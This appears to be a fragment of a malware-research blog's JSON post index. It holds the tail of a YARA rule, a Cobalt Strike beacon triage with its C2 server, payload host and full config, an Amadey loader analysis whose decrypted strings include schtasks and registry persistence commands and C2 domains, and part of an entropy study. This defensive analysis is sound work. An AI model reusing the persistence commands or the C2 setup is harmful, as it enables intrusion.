CF CD CF CE CF CD ?? ?? CF CC CF CD CF CB ?? ?? ?? ?? CF CB CF CD CF CB ?? ?? ?? ?? CF CA CF CE CF CD ?? ?? } $s208 = { D0 D1 D0 D1 D0 D2 ?? ?? D0 D2 D0 D1 D0 D2 ?? ?? D0 D3 D0 D2 D0 D4 ?? ?? ?? ?? D0 D4 D0 D2 D0 D4 ?? ?? ?? ?? D0 D5 D0 D1 D0 D2 ?? ?? } $s209 = { D1 D0 D1 D0 D1 D3 ?? ?? D1 D3 D1 D0 D1 D3 ?? ?? D1 D2 D1 D3 D1 D5 ?? ?? ?? ?? D1 D5 D1 D3 D1 D5 ?? ?? ?? ?? D1 D4 D1 D0 D1 D3 ?? ?? } $s210 = { D2 D3 D2 D3 D2 D0 ?? ?? D2 D0 D2 D3 D2 D0 ?? ?? D2 D1 D2 D0 D2 D6 ?? ?? ?? ?? D2 D6 D2 D0 D2 D6 ?? ?? ?? ?? D2 D7 D2 D3 D2 D0 ?? ?? } $s211 = { D3 D2 D3 D2 D3 D1 ?? ?? D3 D1 D3 D2 D3 D1 ?? ?? D3 D0 D3 D1 D3 D7 ?? ?? ?? ?? D3 D7 D3 D1 D3 D7 ?? ?? ?? ?? D3 D6 D3 D2 D3 D1 ?? ?? } $s212 = { D4 D5 D4 D5 D4 D6 ?? ?? D4 D6 D4 D5 D4 D6 ?? ?? D4 D7 D4 D6 D4 D0 ?? ?? ?? ?? D4 D0 D4 D6 D4 D0 ?? ?? ?? ?? D4 D1 D4 D5 D4 D6 ?? ?? } $s213 = { D5 D4 D5 D4 D5 D7 ?? ?? D5 D7 D5 D4 D5 D7 ?? ?? D5 D6 D5 D7 D5 D1 ?? ?? ?? ?? D5 D1 D5 D7 D5 D1 ?? ?? ?? ?? D5 D0 D5 D4 D5 D7 ?? ?? } $s214 = { D6 D7 D6 D7 D6 D4 ?? ?? D6 D4 D6 D7 D6 D4 ?? ?? D6 D5 D6 D4 D6 D2 ?? ?? ?? ?? D6 D2 D6 D4 D6 D2 ?? ?? ?? ?? D6 D3 D6 D7 D6 D4 ?? ?? } $s215 = { D7 D6 D7 D6 D7 D5 ?? ?? D7 D5 D7 D6 D7 D5 ?? ?? D7 D4 D7 D5 D7 D3 ?? ?? ?? ?? D7 D3 D7 D5 D7 D3 ?? ?? ?? ?? D7 D2 D7 D6 D7 D5 ?? ?? } $s216 = { D8 D9 D8 D9 D8 DA ?? ?? D8 DA D8 D9 D8 DA ?? ?? D8 DB D8 DA D8 DC ?? ?? ?? ?? D8 DC D8 DA D8 DC ?? ?? ?? ?? D8 DD D8 D9 D8 DA ?? ?? } $s217 = { D9 D8 D9 D8 D9 DB ?? ?? D9 DB D9 D8 D9 DB ?? ?? D9 DA D9 DB D9 DD ?? ?? ?? ?? D9 DD D9 DB D9 DD ?? ?? ?? ?? D9 DC D9 D8 D9 DB ?? ?? } $s218 = { DA DB DA DB DA D8 ?? ?? DA D8 DA DB DA D8 ?? ?? DA D9 DA D8 DA DE ?? ?? ?? ?? DA DE DA D8 DA DE ?? ?? ?? ?? DA DF DA DB DA D8 ?? ?? } $s219 = { DB DA DB DA DB D9 ?? ?? DB D9 DB DA DB D9 ?? ?? DB D8 DB D9 DB DF ?? ?? ?? ?? DB DF DB D9 DB DF ?? ?? ?? ?? DB DE DB DA DB D9 ?? ?? } $s220 = { DC DD DC DD DC DE ?? ?? DC DE DC DD DC DE ?? ?? DC DF DC DE DC D8 ?? ?? ?? ?? DC D8 DC DE DC D8 ?? ?? ?? ?? DC D9 DC DD DC DE ?? ?? } $s221 = { DD DC DD DC DD DF ?? ?? DD DF DD DC DD DF ?? ?? DD DE DD DF DD D9 ?? ?? ?? ?? DD D9 DD DF DD D9 ?? ?? ?? ?? DD D8 DD DC DD DF ?? ?? } $s222 = { DE DF DE DF DE DC ?? ?? DE DC DE DF DE DC ?? ?? DE DD DE DC DE DA ?? ?? ?? ?? DE DA DE DC DE DA ?? ?? ?? ?? DE DB DE DF DE DC ?? ?? } $s223 = { DF DE DF DE DF DD ?? ?? DF DD DF DE DF DD ?? ?? DF DC DF DD DF DB ?? ?? ?? ?? DF DB DF DD DF DB ?? ?? ?? ?? DF DA DF DE DF DD ?? ?? } $s224 = { E0 E1 E0 E1 E0 E2 ?? ?? E0 E2 E0 E1 E0 E2 ?? ?? E0 E3 E0 E2 E0 E4 ?? ?? ?? ?? E0 E4 E0 E2 E0 E4 ?? ?? ?? ?? E0 E5 E0 E1 E0 E2 ?? ?? } $s225 = { E1 E0 E1 E0 E1 E3 ?? ?? E1 E3 E1 E0 E1 E3 ?? ?? E1 E2 E1 E3 E1 E5 ?? ?? ?? ?? E1 E5 E1 E3 E1 E5 ?? ?? ?? ?? E1 E4 E1 E0 E1 E3 ?? ?? } $s226 = { E2 E3 E2 E3 E2 E0 ?? ?? E2 E0 E2 E3 E2 E0 ?? ?? E2 E1 E2 E0 E2 E6 ?? ?? ?? ?? E2 E6 E2 E0 E2 E6 ?? ?? ?? ?? E2 E7 E2 E3 E2 E0 ?? ?? } $s227 = { E3 E2 E3 E2 E3 E1 ?? ?? E3 E1 E3 E2 E3 E1 ?? ?? E3 E0 E3 E1 E3 E7 ?? ?? ?? ?? E3 E7 E3 E1 E3 E7 ?? ?? ?? ?? E3 E6 E3 E2 E3 E1 ?? ?? } $s228 = { E4 E5 E4 E5 E4 E6 ?? ?? E4 E6 E4 E5 E4 E6 ?? ?? E4 E7 E4 E6 E4 E0 ?? ?? ?? ?? E4 E0 E4 E6 E4 E0 ?? ?? ?? ?? E4 E1 E4 E5 E4 E6 ?? ?? } $s229 = { E5 E4 E5 E4 E5 E7 ?? ?? E5 E7 E5 E4 E5 E7 ?? ?? E5 E6 E5 E7 E5 E1 ?? ?? ?? ?? E5 E1 E5 E7 E5 E1 ?? ?? ?? ?? E5 E0 E5 E4 E5 E7 ?? ?? } $s230 = { E6 E7 E6 E7 E6 E4 ?? ?? E6 E4 E6 E7 E6 E4 ?? ?? E6 E5 E6 E4 E6 E2 ?? ?? ?? ?? E6 E2 E6 E4 E6 E2 ?? ?? ?? ?? E6 E3 E6 E7 E6 E4 ?? ?? } $s231 = { E7 E6 E7 E6 E7 E5 ?? ?? E7 E5 E7 E6 E7 E5 ?? ?? E7 E4 E7 E5 E7 E3 ?? ?? ?? ?? E7 E3 E7 E5 E7 E3 ?? ?? ?? ?? E7 E2 E7 E6 E7 E5 ?? ?? } $s232 = { E8 E9 E8 E9 E8 EA ?? ?? E8 EA E8 E9 E8 EA ?? ?? E8 EB E8 EA E8 EC ?? ?? ?? ?? E8 EC E8 EA E8 EC ?? ?? ?? ?? E8 ED E8 E9 E8 EA ?? ?? } $s233 = { E9 E8 E9 E8 E9 EB ?? ?? E9 EB E9 E8 E9 EB ?? ?? E9 EA E9 EB E9 ED ?? ?? ?? ?? E9 ED E9 EB E9 ED ?? ?? ?? ?? E9 EC E9 E8 E9 EB ?? ?? } $s234 = { EA EB EA EB EA E8 ?? ?? EA E8 EA EB EA E8 ?? ?? EA E9 EA E8 EA EE ?? ?? ?? ?? EA EE EA E8 EA EE ?? ?? ?? ?? EA EF EA EB EA E8 ?? ?? } $s235 = { EB EA EB EA EB E9 ?? ?? EB E9 EB EA EB E9 ?? ?? EB E8 EB E9 EB EF ?? ?? ?? ?? EB EF EB E9 EB EF ?? ?? ?? ?? EB EE EB EA EB E9 ?? ?? } $s236 = { EC ED EC ED EC EE ?? ?? EC EE EC ED EC EE ?? ?? EC EF EC EE EC E8 ?? ?? ?? ?? EC E8 EC EE EC E8 ?? ?? ?? ?? EC E9 EC ED EC EE ?? ?? } $s237 = { ED EC ED EC ED EF ?? ?? ED EF ED EC ED EF ?? ?? ED EE ED EF ED E9 ?? ?? ?? ?? ED E9 ED EF ED E9 ?? ?? ?? ?? ED E8 ED EC ED EF ?? ?? } $s238 = { EE EF EE EF EE EC ?? ?? EE EC EE EF EE EC ?? ?? EE ED EE EC EE EA ?? ?? ?? ?? EE EA EE EC EE EA ?? ?? ?? ?? EE EB EE EF EE EC ?? ?? } $s239 = { EF EE EF EE EF ED ?? ?? EF ED EF EE EF ED ?? ?? EF EC EF ED EF EB ?? ?? ?? ?? EF EB EF ED EF EB ?? ?? ?? ?? EF EA EF EE EF ED ?? ?? } $s240 = { F0 F1 F0 F1 F0 F2 ?? ?? F0 F2 F0 F1 F0 F2 ?? ?? F0 F3 F0 F2 F0 F4 ?? ?? ?? ?? F0 F4 F0 F2 F0 F4 ?? ?? ?? ?? F0 F5 F0 F1 F0 F2 ?? ?? } $s241 = { F1 F0 F1 F0 F1 F3 ?? ?? F1 F3 F1 F0 F1 F3 ?? ?? F1 F2 F1 F3 F1 F5 ?? ?? ?? ?? F1 F5 F1 F3 F1 F5 ?? ?? ?? ?? F1 F4 F1 F0 F1 F3 ?? ?? } $s242 = { F2 F3 F2 F3 F2 F0 ?? ?? F2 F0 F2 F3 F2 F0 ?? ?? F2 F1 F2 F0 F2 F6 ?? ?? ?? ?? F2 F6 F2 F0 F2 F6 ?? ?? ?? ?? F2 F7 F2 F3 F2 F0 ?? ?? } $s243 = { F3 F2 F3 F2 F3 F1 ?? ?? F3 F1 F3 F2 F3 F1 ?? ?? F3 F0 F3 F1 F3 F7 ?? ?? ?? ?? F3 F7 F3 F1 F3 F7 ?? ?? ?? ?? F3 F6 F3 F2 F3 F1 ?? ?? } $s244 = { F4 F5 F4 F5 F4 F6 ?? ?? F4 F6 F4 F5 F4 F6 ?? ?? F4 F7 F4 F6 F4 F0 ?? ?? ?? ?? F4 F0 F4 F6 F4 F0 ?? ?? ?? ?? F4 F1 F4 F5 F4 F6 ?? ?? } $s245 = { F5 F4 F5 F4 F5 F7 ?? ?? F5 F7 F5 F4 F5 F7 ?? ?? F5 F6 F5 F7 F5 F1 ?? ?? ?? ?? F5 F1 F5 F7 F5 F1 ?? ?? ?? ?? F5 F0 F5 F4 F5 F7 ?? ?? } $s246 = { F6 F7 F6 F7 F6 F4 ?? ?? F6 F4 F6 F7 F6 F4 ?? ?? F6 F5 F6 F4 F6 F2 ?? ?? ?? ?? F6 F2 F6 F4 F6 F2 ?? ?? ?? ?? F6 F3 F6 F7 F6 F4 ?? ?? } $s247 = { F7 F6 F7 F6 F7 F5 ?? ?? F7 F5 F7 F6 F7 F5 ?? ?? F7 F4 F7 F5 F7 F3 ?? ?? ?? ?? F7 F3 F7 F5 F7 F3 ?? ?? ?? ?? F7 F2 F7 F6 F7 F5 ?? ?? } $s248 = { F8 F9 F8 F9 F8 FA ?? ?? F8 FA F8 F9 F8 FA ?? ?? F8 FB F8 FA F8 FC ?? ?? ?? ?? F8 FC F8 FA F8 FC ?? ?? ?? ?? F8 FD F8 F9 F8 FA ?? ?? } $s249 = { F9 F8 F9 F8 F9 FB ?? ?? F9 FB F9 F8 F9 FB ?? ?? F9 FA F9 FB F9 FD ?? ?? ?? ?? F9 FD F9 FB F9 FD ?? ?? ?? ?? F9 FC F9 F8 F9 FB ?? ?? } $s250 = { FA FB FA FB FA F8 ?? ?? FA F8 FA FB FA F8 ?? ?? FA F9 FA F8 FA FE ?? ?? ?? ?? FA FE FA F8 FA FE ?? ?? ?? ?? FA FF FA FB FA F8 ?? ?? } $s251 = { FB FA FB FA FB F9 ?? ?? FB F9 FB FA FB F9 ?? ?? FB F8 FB F9 FB FF ?? ?? ?? ?? FB FF FB F9 FB FF ?? ?? ?? ?? FB FE FB FA FB F9 ?? ?? } $s252 = { FC FD FC FD FC FE ?? ?? FC FE FC FD FC FE ?? ?? FC FF FC FE FC F8 ?? ?? ?? ?? FC F8 FC FE FC F8 ?? ?? ?? ?? FC F9 FC FD FC FE ?? ?? } $s253 = { FD FC FD FC FD FF ?? ?? FD FF FD FC FD FF ?? ?? FD FE FD FF FD F9 ?? ?? ?? ?? FD F9 FD FF FD F9 ?? ?? ?? ?? FD F8 FD FC FD FF ?? ?? } $s254 = { FE FF FE FF FE FC ?? ?? FE FC FE FF FE FC ?? ?? FE FD FE FC FE FA ?? ?? ?? ?? FE FA FE FC FE FA ?? ?? ?? ?? FE FB FE FF FE FC ?? ?? } $s255 = { FF FE FF FE FF FD ?? ?? FF FD FF FE FF FD ?? ?? FF FC FF FD FF FB ?? ?? ?? ?? FF FB FF FD FF FB ?? ?? ?? ?? FF FA FF FE FF FD ?? ?? } $fp1 = &quot;ICSharpCode.Decompiler&quot; wide condition: any of ($s*) and not 1 of ($fp*) } . Packed Cobalt Strike Beacon Triage . This sample was reccomended, and it was linked (overlapping C2) to a similar sample triaged on Twitter by the @malwrhunterteam. Interesting &quot;VIP Invitation to Doha Expo 2023.docx&quot;: 6b06af3d20fd4f35fe62151d45e4344314d26b68d886d80ad6d8a375820247cfhttps://files.attend-doha-expo[.]com/inv.html Use webdav to get payload after Follina exploit: 5.206.224[.]233 webdav Related opendir: http://5.206.224[.]233/ pic.twitter.com/5PjS5AAPJs . &mdash; MalwareHunterTeam (@malwrhunterteam) June 1, 2022 . The packed PE payload is 083d27a598e1a4c93dc8a9b446ca95c4c7b7b8f2e5fc2f6020b162ead8c91bdf which masquerades as OSD_Sidekick.exe. . Unpacking . When we first ran the sample in x64dbg it terminated with no observed behaviour. Initially I suspected this was due to some ant-debug features but then it was pointed out that they were using direct syscalls to evade API monitoring (breakpoints on VirutalAllocateEx). . . Syscalls . Since syscall numbers vary by OS version they cannot be hard-coded. The packer implemented a simple API hashing algorithm that was used to lookup the syscall number befor using it. We used HashDB to decode these API hashes. . import requests HASHDB_HUNT_URL = &#39;https://hashdb.openanalysis.net/hunt&#39; HASHDB_HASH_URL = &#39;https://hashdb.openanalysis.net/hash&#39; api_hash = 572265531 hunt_request = {&quot;hashes&quot;: [572265531]} r = requests.post(HASHDB_HUNT_URL, json=hunt_request) print(r.json()) . {&#39;hits&#39;: [{&#39;algorithm&#39;: &#39;add1501_shl5&#39;, &#39;count&#39;: 1, &#39;hitrate&#39;: 1.0}]} . r = requests.get(HASHDB_HASH_URL + &#39;/add1501_shl5/&#39; + str(api_hash)) print(r.json()) . {&#39;hashes&#39;: [{&#39;hash&#39;: 572265531, &#39;string&#39;: {&#39;string&#39;: &#39;ZwAllocateVirtualMemory&#39;, &#39;is_api&#39;: True, &#39;permutation&#39;: &#39;api&#39;, &#39;api&#39;: &#39;ZwAllocateVirtualMemory&#39;, &#39;modules&#39;: [&#39;ntdll&#39;]}}]} . Unpacked Payload . Once we decodede the syscalls they led us to a familliar set of APIs... . ZwAllocateVirtualMemory | ZwGetContextThread | ZwProtectVirtualMemory | ZwResumeThread | ZwSetContextThread | ZwTerminateProcess | ZwWriteVirtualMemory | . Adding breakpoints on these syscalls led us to discover and CobaltStrike PE payload that had been embeded in the .text section of the packed PE and was decrypted in place. Before the payload could be mapped and executed it we dumped it: e596a17260e6e5ec4c5d2160a6d645cdefb7a4bbe57efc7a5c963ad677cd98f6. . Beacon Config . Once the payload was dumped we used the Sentinal-One CS beacon config extractor to pull the following config. . BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 2097328 Jitter - 20 PublicKey_MD5 - 3c12281e9b883260fd0af24adb44cb94 C2Server - www.telecomly.info,/Collector/2.0/settings/ UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.4.00.2879 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36 HttpPostUri - /users/8:orgid:c2811-b2a4-2b33-3be12bad1/endpoints/events/poll Malleable_C2_Instructions - Remove 46 bytes from the end Remove 130 bytes from the beginning NetBIOS decode &#39;a&#39; HttpGet_Metadata - ConstHeaders Accept: json Host: westeurope-teams.azureedge.net Referer: https://teams.microsoft.com/_ x-ms-session-id: b4421c12-21a3-b771-c112-f11bf11a127b x-ms-client-type: desktop x-mx-client-version: 27/1.0.0.2021020410 Accept-Encoding: gzip, deflate, br Origin: https://teams.microsoft.com ConstParams qsp=true client-id=NO_AUTH sdk-version=ACT-Web-JS-2.5.0&amp; Metadata base64url parameter &quot;events&quot; HttpPost_Metadata - ConstHeaders Accept: json Host: westeurope-teams.azureedge.net Referer: https://teams.microsoft.com/_ x-ms-query-params: cursor=1312212112&amp;epfs=srt&amp;sca=5&amp;activeTimeout=135 x-ms-client-type: desktop x-mx-client-version: 27/1.0.0.2021020410 Accept-Encoding: gzip, deflate, br Origin: https://teams.microsoft SessionId netbios prepend &quot;b83d5243-176b-b887-1d36-&quot; header &quot;x-ms-session-id&quot; Output base64 prepend &quot;skypetoken=eyJhdFba1e&quot; header &quot;Authentication&quot; HttpGet_Verb - GET HttpPost_Verb - GET HttpPostChunk - 96 Spawnto_x86 - %windir% syswow64 werfault.exe Spawnto_x64 - %windir% sysnative werfault.exe CryptoScheme - 0 Proxy_Behavior - Use IE settings Watermark_Hash - XjowzohquO5k0WW/OtRHVw== Watermark - 123456789 bStageCleanup - False bCFGCaution - False KillDate - 0 bProcInject_StartRWX - False bProcInject_UseRWX - False bProcInject_MinAllocSize - 17500 ProcInject_PrependAppend_x86 - b&#39; x90 x90&#39; Empty ProcInject_PrependAppend_x64 - b&#39; x90 x90&#39; Empty ProcInject_Execute - ntdll:RtlUserThreadStart CreateThread NtQueueApcThread-s CreateRemoteThread RtlCreateUserThread ProcInject_AllocationMethod - NtMapViewOfSection bUsesCookies - False DNS_strategy - round-robin DNS_strategy_rotate_seconds - -1 DNS_strategy_fail_x - -1 DNS_strategy_fail_seconds - -1 Retry_Max_Attempts - 0 Retry_Increase_Attempts - 0 Retry_Duration - 0 .",
            "url": "https://research.openanalysis.net/emulation/dumpulator/cobaltstrike/config/2022/06/09/cobaltstrike.html",
            "relUrl": "/emulation/dumpulator/cobaltstrike/config/2022/06/09/cobaltstrike.html",
            "date": " ‚Ä¢ Jun 9, 2022"
        }
        
    
  
    
        ,"post46": {
            "title": "Triage Amadey Loader",
            "content": "Overview . Unknown sample from MalwareBazaar. Some of the sandbox tags labeled it as amadey, we are going to validate this. . Samples . Packed Sample: 7ff0ff6e51a58398ad73da3cc8e7e6233a23e49d93aaa4b190672e4f9f08b9bb | Unpacked Sample: 6e01f9d1997186d06274a508bc0a511aa6fb50e430b77efca593c00d3fc62cba | . References . ANY.RUN detects as amadey | Intezer detects as deyma | JoeSandbox detects as amadey | Hatching detects as amadey | Analyzing Amadey Loader | . According to Malpedia . Amadey is a botnet that appeared around October 2018 and is being sold for about 500$ on Russian-speaking hacking forums. It periodically sends information about the system and installed AV software to its C2 server and polls to receive orders from it. Its main functionality is that it can load other payloads (called &quot;tasks&quot;) for all or specifically targeted computers compromised by the malware. . Analysis . Artifacts . PDB string D: Mktmp NL1 Release NL1.pdb | Compiled with Microsoft Visual C/C++ | . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . key_buff = b&#39;6768875d0dd576a718d85aa1d71d25c1 x00&#39; data_buff = b&#39;6679AA9D98A9C95093B7785783AA85868CA95864AEB051955760B88055&#39; out = [] def decrypt_string(data, key): data = unhex(data) key = key[1:] out = [] for i in range(len(data)): out.append((data[i] - key[i % len(key)]) &amp; 0xff) return bytes(out) print(decrypt_string(data_buff, key_buff)) . b&#39;/Create /SC MINUTE /MO 1 /TN &#39; . import re FILE_PATH = &#39;/tmp/amadey_unpacked.bin&#39; data = open(FILE_PATH, &#39;rb&#39;).read() def get_strings(): string_egg = rb&#39;(([A-F0-9]{2}){4,}) x00&#39; enc_strings = [] for m in re.finditer(string_egg, data): enc_str = m.group(1) enc_strings.append(enc_str) return enc_strings def get_keys(): key_egg = rb&#39;([a-f0-9]{2}){8,} x00&#39; keys = [] for m in re.finditer(key_egg, data): key_str = m.group(0) keys.append(key_str) return keys . is_ascii = lambda s: re.match(b&#39;^[ s!-~]+$&#39;, s) def validate_key(keys, strings): canary_str = max(strings, key=len) for key in keys: if is_ascii(decrypt_string(canary_str, key)): return key return None def decrypt_strings(data): out = [] enc_strings = get_strings() keys = get_keys() key = validate_key(keys, enc_strings) if key is not None: for s in enc_strings: out.append(decrypt_string(s, key)) return out strings = decrypt_strings(data) for s in strings: print(s) . b&#39;happyday9risce.com&#39; b&#39;/gg4mn3s/index.php&#39; b&#39;xksldjf9sksdjfks.com&#39; b&#39;dhisa8f9ah02hopasiaf.com&#39; b&#39;3.20&#39; b&#39;a10b8dfb5f&#39; b&#39;orxds.exe&#39; b&#39;SCHTASKS&#39; b&#39;/Create /SC MINUTE /MO 1 /TN &#39; b&#39; /TR &#34;&#39; b&#39;&#34; /F&#39; b&#39;/C REG ADD &#34;HKCU Software Microsoft Windows CurrentVersion Explorer User Shell Folders&#34; /f /v Startup /t REG_SZ /d &#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Explorer Shell Folders&#39; b&#39;Startup&#39; b&#39;/C REG ADD &#34;HKCU SOFTWARE Microsoft Windows CurrentVersion RunOnce&#34; /f /v rem /t REG_SZ /d &#39; b&#39;&#34;cmd /C RMDIR /s/q &#34;&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Run&#39; b&#39;rundll32 &#39; b&#39; /Delete /TN &#34;&#39; b&#39;powershell&#39; b&#34;-Command $action = New-ScheduledTaskAction -Execute &#39;&#34; b&#34;&#39;; $time = New-TimeSpan -Minutes 1; $trigger = New-ScheduledTaskTrigger -Once -At 0:00 -RepetitionInterval $time; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName &#39;&#34; b&#34;-Command $action = Unregister-ScheduledTask -TaskName &#39;&#34; b&#39;-Confirm: $false&#39; b&#39;POST&#39; b&#39;&amp;vs=&#39; b&#39;&amp;sd=&#39; b&#39;&amp;os=&#39; b&#39;&amp;bi=&#39; b&#39;&amp;ar=&#39; b&#39;&amp;pc=&#39; b&#39;&amp;un=&#39; b&#39;&amp;dm=&#39; b&#39;&amp;av=&#39; b&#39;&amp;lv=&#39; b&#39;cred.dll|&#39; b&#39;Main&#39; b&#39;http://&#39; b&#39;https://&#39; b&#39;Plugins/&#39; b&#39;&amp;unit=&#39; b&#39;shell32.dll&#39; b&#39;kernel32.dll&#39; b&#39;GetNativeSystemInfo&#39; b&#39;ProgramData &#39; b&#39;AVAST Software&#39; b&#39;Avira&#39; b&#39;Kaspersky Lab&#39; b&#39;ESET&#39; b&#39;Panda Security&#39; b&#39;Doctor Web&#39; b&#39;360TotalSecurity&#39; b&#39;Bitdefender&#39; b&#39;Norton&#39; b&#39;Sophos&#39; b&#39;Comodo&#39; b&#39;WinDefender&#39; b&#39;0123456789&#39; b&#39;Content-Type: multipart/form-data; boundary=-&#39; b&#39;&#39; b&#39; r nContent-Disposition: form-data; name=&#34;data&#34;; filename=&#34;&#39; b&#39;&#34; r nContent-Type: application/octet-stream r n r n&#39; b&#39; r n&#39; b&#39;-- r n&#39; b&#39;?scr=1&#39; b&#39;.jpg&#39; b&#39;Content-Type: application/x-www-form-urlencoded&#39; b&#39;SYSTEM CurrentControlSet Control ComputerName ComputerName&#39; b&#39;ComputerName&#39; b&#39;abcdefghijklmnopqrstuvxyz0123456789-_&#39; b&#39;-unicode-&#39; b&#39;SYSTEM CurrentControlSet Control UnitedVideo CONTROL VIDEO &#39; b&#39;SYSTEM ControlSet001 Services BasicDisplay Video&#39; b&#39;VideoID&#39; b&#39; 0000&#39; b&#39;DefaultSettings.XResolution&#39; b&#39;DefaultSettings.YResolution&#39; b&#39;SOFTWARE Microsoft Windows NT CurrentVersion&#39; b&#39;ProductName&#39; b&#39;2019&#39; b&#39;2022&#39; b&#39;2016&#39; b&#39;CurrentBuild&#39; b&#39;cmd.exe&#39; b&#39;/c echo Y|CACLS &#34;&#39; b&#39;&#34; /P &#34;&#39; b&#39;/c CACLS &#34;&#39; b&#39;:R&#34; /E&#39; b&#39;:F&#34; /E&#39; b&#39;AppData&#39; b&#39;rundll32.exe&#39; .",
            "url": "https://research.openanalysis.net/triage/malware/amadey/loader/config/2022/05/29/traige-amadey-loader.html",
            "relUrl": "/triage/malware/amadey/loader/config/2022/05/29/traige-amadey-loader.html",
            "date": " ‚Ä¢ May 29, 2022"
        }
        
    
  
    
        ,"post47": {
            "title": "Does Entropy Matter? A Pseudoscientific Study!",
            "content": "Overview . Entroy is obviously useful and tells us information about the binary. However, can we use entropy alone to determine if a sample is packed or not. Let&#39;s define the parameters for our study. . Without looking at the binary in IDA (or your RE tool of choice) can you use entropy to determine if the sample is packed? | We are defining &quot;packed&quot; as a file that contains an encrypted, or compressed payload, where our analysis goals are to analyze the payload and not the packer. | Are there specific data in the binary that can be tested for entopy that will give use a better answer than testing the full binary? For example, looking at the entropy of sections, or of resources. | . References . Understanding Shannon&#39;s Entropy metric for Information | Using entropy to spot the malware hiding in plain sight | merces/entropy (github) | PowerShellArsenal/Misc/Get-Entropy.ps1 | Using Entropy Analysis to Find Encrypted and Packed Malware (bintropy) | bintropy (github) | Packer Detection for Multi-Layer Executables Using Entropy Analysis | Generic unpacking using entropy analysis | . Our Problem . Based on entropy can we make a decision about whether or not to open a sample in IDA by looking at entropy alone. If we cannot make this decision we will have to open the binary in IDA so why bother looking at entropy at all? . Our Study . For our study we are going to collect a set of known packed, and unpacked (payload) samples to use as our ground truth. We will then run differnt types of entropy calculation on the binaries and look for a common cutoff where we could made a decision that the samples are packed/unpacked. If the cutoff is such that we cannot classify all samples within an error margin of ERROR-RATE-TBD then we can conclude that entropy will not consistantly answer our problem statement. . Tools . We are going to use bintropy and the standard section entropy calculation from pefile as our two tools. . import pefile import bintropy def pe_test(file_path, all_sections=True): # # We will test the entropy of the non-executable sections # and return the largest entropy value # pe = pefile.PE(file_path) entropy_list = [] for s in pe.sections: if all_sections: entropy_list.append(s.get_entropy()) elif not s.IMAGE_SCN_CNT_CODE: entropy_list.append(s.get_entropy()) if len(entropy_list) == 0: return 0 return max(entropy_list) def is_dotnet(file_path): pe = pefile.PE(file_path) isDotNet = pe.OPTIONAL_HEADER.DATA_DIRECTORY[14] if isDotNet.VirtualAddress == 0 and isDotNet.Size == 0: return False else: return True def bintropy_test(file_path, get_average=True): h_e, av_e = bintropy.bintropy(file_path, decide=False) if get_average: return av_e else: return h_e . UNPACKED_DIR = &#39;/tmp/unpacked&#39; PACKED_DIR = &#39;/tmp/packed&#39; file_path = &#39;/tmp/packed/ff5ac0eb80d90c6a2a46a4133fc8d90cd165b8b2bac1cbaa8fadd35b186bd5c8.bin&#39; # # threshold avg packed 6.677 # threshold highest packed 7.199 # # test all sections print(&quot; ntesting all sections&quot;) pe = pefile.PE(file_path) for s in pe.sections: print(f&quot; is code: {s.IMAGE_SCN_CNT_CODE} -- {s.get_entropy()}&quot;) # test the pe method only data print(&quot; ntest highest entropy from data sections&quot;) print(pe_test(file_path, all_sections=False)) # test the pe method all sections print(&quot; ntest highest entropy from all sections&quot;) print(pe_test(file_path, all_sections=True)) # test bintropy average print(&quot; ntest bintropy average&quot;) print(bintropy_test(file_path, get_average=True)) # test bintropy average print(&quot; ntest bintropy highest&quot;) print(bintropy_test(file_path, get_average=False)) . testing all sections is code: True -- 7.6981527898958 is code: False -- 5.395082466102808 is code: False -- 2.3168484674576013 is code: False -- 0.020393135236084953 is code: False -- 4.823677517350269 test highest entropy from data sections 5.395082466102808 test highest entropy from all sections 7.6981527898958 test bintropy average 6.267216812715635 test bintropy highest 7.796875 . First Test of All Methods . import os from rich.console import Console from rich.table import Table # assign directory directory = PACKED_DIR # iterate over files in # that directory table = Table(title=&quot;Packed Samples&quot;, expand=True) table.add_column(&quot;file&quot;, justify=&quot;center&quot;, no_wrap=True, ) table.add_column(&quot;.NET&quot;, justify=&quot;center&quot;, no_wrap=True, ) table.add_column(&quot;pe data&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;pe all&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;pe all npacked @ 7&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin ave&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin all&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin all npacked @ 7&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin t/f&quot;, justify=&quot;center&quot;, no_wrap=True) for filename in os.listdir(directory): f = os.path.join(directory, filename) # checking if it is a file if os.path.isfile(f): file_path = f pe_data = pe_test(file_path, all_sections=False) pe_all = pe_test(file_path, all_sections=True) bin_ave = bintropy_test(file_path, get_average=True) bin_all = bintropy_test(file_path, get_average=False) bin_tf = bintropy.bintropy(file_path) dotnet = is_dotnet(file_path) table.add_row(filename[:5], str(dotnet), str(pe_data)[:4], str(pe_all)[:4], str(True if pe_all &gt; 7 else False), str(bin_ave)[:4], str(bin_all)[:4], str(True if bin_all &gt; 7 else False), str(bin_tf)) console = Console() console.print(table) . Packed Samples 